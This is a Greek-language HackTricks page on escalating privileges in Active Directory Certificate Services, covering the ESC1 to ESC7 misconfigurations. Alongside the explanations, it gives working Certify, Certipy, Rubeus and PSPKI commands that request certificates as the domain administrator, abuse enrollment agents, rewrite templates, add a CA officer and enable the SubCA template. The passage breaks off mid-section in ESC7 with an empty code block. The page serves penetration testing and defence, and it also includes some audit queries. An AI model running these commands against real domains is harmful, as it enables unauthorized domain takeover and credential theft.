# AD CS Ανέλιξη Τομέα

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

**Αυτό είναι ένα σύνοψη των ενοτήτων τεχνικών ανέλιξης τους δημοσιεύσεων:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Εσφαλμένα Πρότυπα Πιστοποιητικών - ESC1

### Εξήγηση

### Εξήγηση Εσφαλμένων Προτύπων Πιστοποιητικών - ESC1

* **Τα δικαιώματα εγγραφής παρέχονται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.**
* **Δεν απαιτείται έγκριση διαχειριστή.**
* **Δεν απαιτούνται υπογραφές από εξουσιοδοτημένο προσωπικό.**
* **Οι περιγραφείς ασφαλείας στα πρότυπα πιστοποιητικών είναι υπερβολικά επιτρεπτικές, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτήσουν δικαιώματα εγγραφής.**
* **Τα πρότυπα πιστοποιητικών έχουν διαμορφωθεί για να καθορίζουν EKUs που διευκολύνουν την πιστοποίηση ταυτότητας:**
* Συμπεριλαμβάνονται αναγνωριστικά Επεκτεινόμενης Χρήσης Κλειδιού (EKU) όπως Πιστοποίηση Πελάτη (OID 1.3.6.1.5.5.7.3.2), Πιστοποίηση Πελάτη PKINIT (1.3.6.1.5.2.3.4), Σύνδεση με Έξυπνη Κάρτα (OID 1.3.6.1.4.1.311.20.2.2), Οποιοδήποτε Σκοπό (OID 2.5.29.37.0) ή κανένα EKU (SubCA).
* **Το πρότυπο πιστοποιητικού επιτρέπει στους αιτούντες να συμπεριλάβουν ένα subjectAltName στο Certificate Signing Request (CSR):**
* Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) σε ένα πιστοποιητικό για τον έλεγχο ταυτότητας εάν είναι παρόν. Αυτό σημαίνει ότι, καθορίζοντας το SAN σε ένα CSR, μπορεί να ζητηθεί ένα πιστοποιητικό για να προσομοιώσει οποιονδήποτε χρήστη (π.χ. διαχειριστή τομέα). Εάν ο αιτών μπορεί να καθορίσει ένα SAN δηλώνεται στο αντικείμενο AD του προτύπου πιστοποιητικού μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι ένα bitmask και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει την καθορισμό του SAN από τον αιτούντα.

{% hint style="danger" %}
Η διαμόρφωση που περιγράφεται επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητήσουν πιστοποιητικά με οποιοδήποτε SAN επιλογής, επιτρέποντας την πιστοποίηση ως οποιονδήποτε κύριο τομέα μέσω Kerberos ή SChannel.
{% endhint %}

Αυτή η δυνατότητα ενεργοποιείται μερικές φορές για να υποστηρίξει τη δημιουργία HTTPS ή πιστοποιητικών κεντρικού υπολογιστή από προϊόντα ή υπηρεσίες αναπτύξεων, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία ενός πιστοποιητικού με αυτήν την επιλογή ενεργοποιεί έναν προειδοποιητικό μηνύματος, που δεν συμβαίνει όταν ένα υπάρχον πρότυπο πιστοποιητικού (όπως το πρότυπο `WebServer`, που έχει ενεργοποιημένη την `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) αντιγράφεται και στη συνέχεια τροποποιείται για να περιλαμβάνει ένα OID πιστοποίησης.

### Κατάχρηση

Για να **βρείτε ευάλωτα πρότυπα πιστοποιητικών** μπορείτε να εκτελέσετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να **καταχραστείτε αυτήν την ευπάθεια για να προσομοιώσετε έναν διαχειριστή**, μπορείτε να εκτελέσετε:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Στη συνέχεια, μπορείτε να μετατρέψετε το παραγόμενο **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για **πιστοποίηση χρησιμοποιώντας το Rubeus ή το certipy** ξανά:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα δυαδικά αρχεία των Windows "Certreq.exe" και "Certutil.exe" μπορούν να χρησιμοποιηθούν για τη δημιουργία του PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απαρίθμηση των προτύπων πιστοποιητικών εντός του σχήματος διαμόρφωσης του AD Forest, ειδικότερα αυτών που δεν απαιτούν έγκριση ή υπογραφές, διαθέτουν το EKU της Πιστοποίησης Πελάτη ή της Σύνδεσης με Έξυπνη Κάρτα και έχουν ενεργοποιημένη τη σημαία `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, μπορεί να γίνει με την εκτέλεση του παρακάτω ερωτήματος LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Εσφαλμένα διαμορφωμένα πρότυπα πιστοποιητικών - ESC2

### Εξήγηση

Το δεύτερο σενάριο κατάχρησης είναι μια παραλλαγή του πρώτου:

1. Τα δικαιώματα εγγραφής παρέχονται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.
2. Η απαίτηση για έγκριση από τον διευθυντή απενεργοποιείται.
3. Παραλείπεται η ανάγκη για εξουσιοδοτημένες υπογραφές.
4. Ένας υπερβολικά επιτρεπτικός περιγραφέας ασφαλείας στο πρότυπο πιστοποιητικού παρέχει δικαιώματα εγγραφής πιστοποιητικού σε χρήστες με χαμηλά προνόμια.
5. **Το πρότυπο πιστοποιητικού καθορίζεται να περιλαμβάνει το οποιοδήποτε σκοπό EKU ή κανένα EKU.**

Το **οποιοδήποτε σκοπό EKU** επιτρέπει σε ένα πιστοποιητικό να ληφθεί από έναν επιτιθέμενο για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένης της πιστοποίησης πελάτη, της πιστοποίησης διακομιστή, της υπογραφής κώδικα, κλπ. Η ίδια **τεχνική που χρησιμοποιείται για το ESC3** μπορεί να χρησιμοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Τα πιστοποιητικά με **κανένα EKU**, τα οποία λειτουργούν ως πιστοποιητικά υποκατηγορίας CA, μπορούν να εκμεταλλευτούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων πιστοποιητικών**. Έτσι, ένας επιτιθέμενος μπορεί να καθορίσει αυθαίρετα EKU ή πεδία στα νέα πιστοποιητικά χρησιμοποιώντας ένα πιστοποιητικό υποκατηγορίας CA.

Ωστόσο, τα νέα πιστοποιητικά που δημιουργούνται για την **πιστοποίηση του τομέα** δεν θα λειτουργήσουν εάν το υποκατάστημα CA δεν είναι εμπιστευμένο από το αντικείμενο **`NTAuthCertificates`**, το οποίο είναι η προεπιλεγμένη ρύθμιση. Ωστόσο, ένας επιτιθέμενος μπορεί ακόμα να δημιουργήσει **νέα πιστοποιητικά με οποιονδήποτε EKU** και αυθαίρετες τιμές πιστοποιητικού. Αυτά θα μπορούσαν να εκμεταλλευτούνται δυνητικά για μια ευρεία γκάμα σκοπών (π.χ. υπογραφή κώδικα, πιστοποίηση διακομιστή, κλπ.) και θα μπορούσαν να έχουν σημαντικές επιπτώσεις για άλλες εφαρμογές στο δίκτυο, όπως SAML, AD FS ή IPSec.

Για να απαριθμήσετε τα πρότυπα που ταιριάζουν σε αυτό το σενάριο μέσα στο σχήμα διαμόρφωσης του AD Forest, μπορείτε να εκτελέσετε τον ακόλουθο ερώτημα LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Εσφαλμένα ρυθμισμένα πρότυπα Πιστοποίησης Πράκτορα Εγγραφής - ESC3

### Εξήγηση

Αυτό το σενάριο είναι παρόμοιο με το πρώτο και το δεύτερο, αλλά **καταχράστηκε** ένα **διαφορετικό EKU** (Πιστοποιητικό Πράκτορα Αίτησης) και **2 διαφορετικά πρότυπα** (επομένως έχει 2 σύνολα απαιτήσεων).

Το **EKU του Πιστοποιητικού Πράκτορα Αίτησης** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Πράκτορας Εγγραφής** στην τεκμηρίωση της Microsoft, επιτρέπει σε έναν αρχηγό να **εγγραφεί** για ένα **πιστοποιητικό** εκ μέρους ενός άλλου χρήστη.

Ο **"πράκτορας εγγραφής"** εγγράφεται σε ένα τέτοιο **πρότυπο** και χρησιμοποιεί το παραγόμενο **πιστοποιητικό για συνυπογραφή ενός CSR εκ μέρους του άλλου χρήστη**. Στη συνέχεια, **αποστέλλει** το **συνυπογεγραμμένο CSR** στον CA, εγγράφοντας σε ένα **πρότυπο** που επιτρέπει την "εγγραφή εκ μέρους", και ο CA απαντά με ένα **πιστοποιητικό που ανήκει στον "άλλο" χρήστη**.

**Απαιτήσεις 1:**

- Τα δικαιώματα εγγραφής παρέχονται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.
- Παραλείπεται η απαίτηση για έγκριση από τον διευθυντή.
- Δεν υπάρχει απαίτηση για εξουσιοδοτημένες υπογραφές.
- Ο ασφαλείας περιγραφέας του προτύπου πιστοποιητικού είναι υπερβολικά επιτρεπτικός, παρέχοντας δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Το πρότυπο πιστοποιητικού περιλαμβάνει το EKU του Πιστοποιητικού Πράκτορα Αίτησης, επιτρέποντας την αίτηση άλλων προτύπων πιστοποιητικών εκ μέρους άλλων αρχηγών.

**Απαιτήσεις 2:**

- Το Enterprise CA παρέχει δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Παρακάμπτεται η έγκριση από τον διευθυντή.
- Η έκδοση του σχήματος του προτύπου είναι είτε 1 είτε υπερβαίνει το 2, και καθορίζει μια απαίτηση έκδοσης Πολιτικής Εφαρμογής που απαιτεί το EKU του Πιστοποιητικού Πράκτορα Αίτησης.
- Ένα EKU που ορίζεται στο πρότυπο πιστοποιητικού επιτρέπει την πιστοποίηση του τομέα.
- Δεν εφαρμόζονται περιορισμοί για τους πράκτορες εγγραφής στον CA.

### Κατάχρηση

Μπορείτε να χρησιμοποιήσετε το [**Certify**](https://github.com/GhostPack/Certify) ή το [**Certipy**](https://github.com/ly4k/Certipy) για να καταχραστείτε αυτό το σενάριο:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι **χρήστες** που επιτρέπεται να **λάβουν** ένα πιστοποιητικό **πράκτορα εγγραφής**, οι πρότυποι στους οποίους οι πράκτορες εγγραφής επιτρέπεται να εγγραφούν και οι **λογαριασμοί** για τους οποίους ο πράκτορας εγγραφής μπορεί να ενεργήσει μπορούν να περιοριστούν από τους επιχειρησιακούς ΑΠ. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` **snap-in**, **δεξί κλικ στον ΑΠ**, **κλικ στις Ιδιότητες** και στη συνέχεια **πλοηγούμενοι** στην καρτέλα "Πράκτορες εγγραφής".

Ωστόσο, παρατηρείται ότι η **προεπιλεγμένη** ρύθμιση για τους ΑΠ είναι "Μην περιορίζετε τους πράκτορες εγγραφής". Όταν οι διαχειριστές ενεργοποιούν τον περιορισμό στους πράκτορες εγγραφής, ορίζοντάς τον σε "Περιορισμός πρακτόρων εγγραφής", η προεπιλεγμένη διαμόρφωση παραμένει ακραία επιεικής. Επιτρέπει σε **Ολους** την πρόσβαση για εγγραφή σε όλα τα πρότυπα ως οποιονδήποτε.

## Ευάλωτος Έλεγχος Πρόσβασης Προτύπων Πιστοποιητικών - ESC4

### **Εξήγηση**

Ο **περιγραφέας ασφαλείας** στα **πρότυπα πιστοποιητικών** καθορίζει τα **δικαιώματα** που έχουν συγκεκριμένοι **κύριοι AD** σχετικά με το πρότυπο.

Αν ένας **επιτιθέμενος** έχει τα απαιτούμενα **δικαιώματα** για να **τροποποιήσει** ένα **πρότυπο** και να **εφαρμόσει** οποιεσδήποτε **ευπάθειες που μπορούν να εκμεταλλευτούν** που περιγράφονται στις **προηγούμενες ενότητες**, μπορεί να διευκολυνθεί η ανέλιξη προνομιακών δικαιωμάτων.

Σημαντικά δικαιώματα που ισχύουν για τα πρότυπα πιστοποιητικών περιλαμβάνουν:

- **Κάτοχος:** Παρέχει αυτόματο έλεγχο επί του αντικειμένου, επιτρέποντας την τροποποίηση οποιουδήποτε χαρακτηριστικού.
- **Πλήρης Έλεγχος:** Επιτρέπει πλήρη εξουσία επί του αντικειμένου, συμπεριλαμβανομένης της δυνατότητας τροποποίησης οποιουδήποτε χαρακτηριστικού.
- **ΕγγραφήΚάτοχου:** Επιτρέπει την τροποποίηση του κατόχου του αντικειμένου σε έναν κύριο που ελέγχεται από τον επιτιθέμενο.
- **ΕγγραφήDacl:** Επιτρέπει την προσαρμογή των ελέγχων πρόσβασης, πιθανώς παρέχοντας στον επιτιθέμενο πλήρη έλεγχο.
- **ΕγγραφήΙδιοκτησίας:** Εξουσιοδοτεί την επεξεργασία οποιουδήποτε χαρακτηριστικού του αντικειμένου.

### Κατάχρηση

Ένα παράδειγμα εκμετάλλευσης όπως το προηγούμενο:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

Το ESC4 είναι όταν ένας χρήστης έχει δικαιώματα εγγραφής σε ένα πρότυπο πιστοποιητικού. Αυτό μπορεί για παράδειγμα να εκμεταλλευτείται για να αντικαταστήσει τη διαμόρφωση του προτύπου πιστοποιητικού και να το καταστήσει ευάλωτο για το ESC1.

Όπως βλέπουμε στην παραπάνω διαδρομή, μόνο ο `JOHNPC` έχει αυτά τα δικαιώματα, αλλά ο χρήστης μας `JOHN` έχει τη νέα σύνδεση `AddKeyCredentialLink` με το `JOHNPC`. Καθώς αυτή η τεχνική σχετίζεται με πιστοποιητικά, έχω εφαρμόσει αυτήν την επίθεση επίσης, γνωστή ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Εδώ έχετε μια μικρή προεπισκόπηση της εντολής `shadow auto` του Certipy για την ανάκτηση του NT hash του θύματος.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
Το **Certipy** μπορεί να αντικαταστήσει τη διαμόρφωση ενός προτύπου πιστοποιητικού με ένα μόνο πρόγραμμα. Από προεπιλογή, το Certipy θα αντικαταστήσει τη διαμόρφωση για να την καταστήσει ευάλωτη στο ESC1. Μπορούμε επίσης να καθορίσουμε την παράμετρο **`-save-old` για να αποθηκεύσουμε την παλιά διαμόρφωση**, η οποία θα είναι χρήσιμη για την **επαναφορά** της διαμόρφωσης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Ευάλωτος Έλεγχος Πρόσβασης Αντικειμένων PKI - ESC5

### Εξήγηση

Ο εκτενής ιστός των συνδεδεμένων σχέσεων βασισμένων σε ACL, που περιλαμβάνει αρκετά αντικείμενα πέρα ​​από τα πρότυπα πιστοποιητικών και την αρχή πιστοποίησης, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, τα οποία μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

* Το αντικείμενο υπολογιστή AD του διακομιστή CA, το οποίο μπορεί να διαταραχθεί μέσω μηχανισμών όπως το S4U2Self ή το S4U2Proxy.
* Ο διακομιστής RPC/DCOM του διακομιστή CA.
* Οποιοδήποτε απόγονο αντικείμενο ή δοχείο AD εντός της συγκεκριμένης διαδρομής δοχείου `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, αλλά δεν περιορίζεται σε, δοχεία και αντικείμενα όπως το δοχείο Πρότυπα Πιστοποιητικών, το δοχείο Αρχές Πιστοποίησης, το αντικείμενο NTAuthCertificates και το δοχείο Υπηρεσίες Εγγραφής.

Η ασφάλεια του συστήματος PKI μπορεί να διαταραχθεί εάν ένας επιτιθέμενος με χαμηλά προνόμια καταφέρει να αποκτήσει έλεγχο επί οποιουδήποτε από αυτά τα κρίσιμα στοιχεία.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Εξήγηση

Το θέμα που συζητήθηκε στην ανάρτηση του [**CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) αναφέρεται επίσης στις επιπτώσεις της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφεται από τη Microsoft. Αυτή η ρύθμιση, όταν ενεργοποιείται σε έναν Αρχή Πιστοποίησης (CA), επιτρέπει την περίληψη **τιμών που καθορίζονται από τον χρήστη** στο **εναλλακτικό όνομα υποκειμένου** για **οποιοδήποτε αίτημα**, συμπεριλαμβανομένων αυτών που δημιουργούνται από το Active Directory®. Ως αποτέλεσμα, αυτή η παροχή επιτρέπει σε έναν **εισβολέα** να εγγραφεί μέσω **οποιουδήποτε προτύπου** που έχει ρυθμιστεί για την **πιστοποίηση τομέα** - ειδικά αυτών που είναι ανοικτά για την εγγραφή χρηστών με **χαμηλά προνόμια**, όπως το πρότυπο Χρήστη. Ως αποτέλεσμα, μπορεί να αποκτηθεί ένα πιστοποιητικό, επιτρέποντας στον εισβολέα να πιστοποιηθεί ως διαχειριστής του τομέα ή **οποιοδήποτε άλλο ενεργό στοιχείο** εντός του τομέα.

**Σημείωση**: Η προσέγγιση για την προσάρτηση **εναλλακτικών ονομάτων** σε ένα αίτημα υπογραφής πιστοποιητικού (CSR), μέσω του ορίσματος `-attrib "SAN:"` στο `certreq.exe` (αναφέρεται ως "Ζεύγη Ονομάτων Τιμών"), παρουσιάζει μια **αντίθεση** από τη στρατηγική εκμετάλλευσης των SANs στο ESC1. Εδώ, η διαφορά έγκειται στον τρόπο που οι πληροφορίες λογαριασμού ενθυλακώνονται - εντός ενός χαρακτηριστικού πιστοποιητικού, αντί για μια επέκταση.

### Κατάχρηση

Για να επαληθεύσουν εάν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την παρακάτω εντολή με το `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η λειτουργία χρησιμοποιεί ουσιαστικά **απομακρυσμένη πρόσβαση στην καταχώρηση του μητρώου**, επομένως, μια εναλλακτική προσέγγιση μπορεί να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως το [**Certify**](https://github.com/GhostPack/Certify) και το [**Certipy**](https://github.com/ly4k/Certipy) είναι ικανά να ανιχνεύσουν αυτήν την εσφαλμένη διαμόρφωση και να την εκμεταλλευτούν:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για να αλλάξετε αυτές τις ρυθμίσεις, υποθέτοντας ότι έχετε δικαιώματα **διαχειριστή του τομέα** ή ισοδύναμα, μπορείτε να εκτελέσετε την παρακάτω εντολή από οποιοδήποτε υπολογιστή εργασίας:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτήν τη διαμόρφωση στο περιβάλλον σας, η σημαία μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα νεοεκδοθέντα **πιστοποιητικά** θα περιέχουν μια **επέκταση ασφαλείας** που ενσωματώνει την ιδιότητα `objectSid` του αιτούντος. Για το ESC1, αυτό το SID προέρχεται από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντικατοπτρίζει το `objectSid` του αιτούντος, όχι το SAN.\
Για να εκμεταλλευτείτε το ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Αδύναμη αντιστοίχιση πιστοποιητικού), το οποίο δίνει προτεραιότητα στο SAN έναντι της νέας επέκτασης ασφαλείας.
{% endhint %}

## Ευάλωτος Έλεγχος Πρόσβασης Αρχής Πιστοποίησης - ESC7

### Επίθεση 1

#### Εξήγηση

Ο έλεγχος πρόσβασης για μια αρχή πιστοποίησης διατηρείται μέσω ενός συνόλου δικαιωμάτων που διέπουν τις ενέργειες της ΑΠ. Αυτά τα δικαιώματα μπορούν να προβληθούν αποκτώντας πρόσβαση στο `certsrv.msc`, κάνοντας δεξί κλικ σε μια ΑΠ, επιλέγοντας ιδιότητες και στη συνέχεια πλοηγούμενοι στην καρτέλα Ασφάλεια. Επιπλέον, τα δικαιώματα μπορούν να απαριθμηθούν χρησιμοποιώντας το πρόσθετο PSPKI με εντολές όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει εισαγωγή στα κύρια δικαιώματα, δηλαδή τα **`ManageCA`** και **`ManageCertificates`**, που συσχετίζονται με τους ρόλους του "διαχειριστή της αρχής πιστοποίησης" και του "διαχειριστή πιστοποιητικών" αντίστοιχα.

#### Κατάχρηση

Έχοντας τα δικαιώματα **`ManageCA`** σε μια αρχή πιστοποίησης, ο χρήστης μπορεί να παρεμβάλει ρυθμίσεις απομακρυσμένα χρησιμοποιώντας το PSPKI. Αυτό περιλαμβάνει την εναλλαγή της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`** για να επιτραπεί η καθορισμός του SAN σε οποιοδήποτε πρότυπο, ένα κρίσιμο στοιχείο για την ανέλιξη του τομέα.

Η απλοποίηση αυτής της διαδικασίας είναι εφικτή μέσω της χρήσης της εντολής **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση αλληλεπίδραση με το γραφικό περιβάλλον.

Η κατοχή των δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση εκκρεμών αιτημάτων, παρακάμπτοντας αποτελεσματικά την προστασία "έγκριση από τον διαχειριστή πιστοποιητικών της αρχής πιστοποίησης".

Μια συνδυασμένη χρήση των ενοτήτων **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για να ζητηθεί, εγκριθεί και κατεβαστεί ένα πιστοποιητικό:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Επίθεση 2

#### Εξήγηση

{% hint style="warning" %}
Στην **προηγούμενη επίθεση** χρησιμοποιήθηκαν οι δικαιώματα **`Manage CA`** για να ενεργοποιηθεί η σημαία **EDITF\_ATTRIBUTESUBJECTALTNAME2** και να πραγματοποιηθεί η επίθεση **ESC6**, αλλά αυτό δεν θα έχει κανένα αποτέλεσμα μέχρι να επανεκκινηθεί η υπηρεσία του CA (`CertSvc`). Όταν ένας χρήστης έχει το δικαίωμα `Manage CA`, του επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η επίθεση **ESC6 μπορεί να μην λειτουργήσει απευθείας** σε περισσότερα περιβάλλοντα που έχουν ενημερωθεί με τις ενημερώσεις ασφαλείας του Μαΐου 2022.
{% endhint %}

Επομένως, παρουσιάζεται εδώ μια άλλη επίθεση.

Προϋποθέσεις:

* Μόνο το δικαίωμα **`ManageCA`**
* Δικαίωμα **`Manage Certificates`** (μπορεί να χορηγηθεί από το **`ManageCA`**)
* Το πρότυπο πιστοποιητικού **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από το **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με το δικαίωμα `Manage CA` _και_ `Manage Certificates` μπορούν να **εκδίδουν αποτυχημένα αιτήματα πιστοποιητικού**. Το πρότυπο πιστοποιητικού **`SubCA`** είναι **ευάλωτο στην επίθεση ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να εγγραφούν στο πρότυπο. Έτσι, ένας **χρήστης** μπορεί να **ζητήσει** να εγγραφεί στο **`SubCA`** - το οποίο θα **απορριφθεί** - αλλά **στη συνέχεια να εκδοθεί από τον διαχειριστή**.

#### Κατάχρηση

Μπορείτε να **χορηγήσετε στον εαυτό σας το δικαίωμα `Manage Certificates`** προσθέτοντας τον χρήστη σας ως νέο αξιωματικό.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Ο πρότυπο **`SubCA`** μπορεί να ενεργοποιηθεί στον CA με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Εάν έχουμε πληρούσει τις προϋποθέσεις για αυτήν την επίθεση, μπορούμε να ξεκινήσουμε **ζητώντας ένα πιστοποιητικό βασισμένο στο πρότυπο `SubCA`**.

**Αυτό το αίτημα θα απορριφθεί**, αλλά θα αποθηκεύσουμε το ιδιωτικό κλειδί και θα καταγράψουμε το αναγνωριστικό του αιτήματος.
```bash
